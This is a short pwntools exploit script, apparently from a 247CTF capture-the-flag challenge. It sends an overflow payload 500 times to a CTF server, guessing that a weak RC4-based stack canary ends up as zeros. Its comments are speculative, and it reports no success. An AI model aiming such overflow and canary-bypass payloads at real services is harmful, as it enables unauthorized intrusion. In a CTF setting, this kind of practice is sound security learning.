#!/usr/bin/env python3
from pwn import *
import time

context.log_level = 'error'

# The trick might be timing-based or the RC4 implementation has a weakness
# Let's analyze: each iteration resets i,j to 0 but S evolves

# Key insight: After exactly 256 iterations, the RC4 S-box might cycle
# or have some predictable property

# Let me try a LOT of iterations to see if canary becomes predictable

p = remote('cfea9b365e987c70.247ctf.com', 50068)
p.recvuntil(b'> ')

# Try many iterations - maybe after some point the canary becomes zeros
# or has some pattern
payload_template = b'A' * 32 + b'\x00' * 16 + b'247CTF:)'

for i in range(500):
    p.send(payload_template)
    response = p.recvuntil(b'> ', timeout=3)
    if b'247CTF{' in response or b'flag' in response.lower():
        print(f"Found at iteration {i}!")
        print(response.decode())
        break
    if i % 100 == 0:
        print(f"Iteration {i}...")

p.close()
print("Done - no flag found with zeros")

# Alternative: Maybe the canary can be predicted because RC4 i,j reset to 0
# This is non-standard RC4 and might have vulnerabilities

# Let me try with the actual RC4 prediction
# After seeing the S-box evolve, can we predict future outputs?
